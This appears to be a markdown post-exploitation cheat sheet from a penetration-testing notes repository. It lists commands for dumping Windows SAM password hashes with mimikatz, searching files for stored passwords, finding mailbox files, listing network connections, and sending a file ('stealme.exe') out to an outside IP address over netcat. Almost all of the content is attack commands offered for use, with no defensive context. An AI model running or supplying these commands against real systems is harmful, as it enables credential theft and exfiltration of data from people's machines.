<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

# Cheatsheets - Effect
* Dump Passwords
* Find Password Files
* Find Emailboxes
* Get Network Connections
* [Exfil via Netcat](#exfil-via-netcat)

## Dump Passwords
```bash
mimikatz.exe "lsadump::sam"
```

## Find Password Files
```bash
findstr /si password *.xml *.ini *.txt (Find passwords)
```

## Find Emailboxes
```bash
dir *.dbx /s 
```

## Get Network Connections
```bash
netstat -ano 
```

## Exfil via Netcat
```bash
nc -nvlp 5050 > stolen.exe
nc.exe -w3 10.11.12.13 5050 < stealme.exe
```

<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md">Top of Page</a> |
  <a href="/CheatSheets/effect.md#bottom-of-page">Bottom of Page</a>
</p>

## Bottom of Page
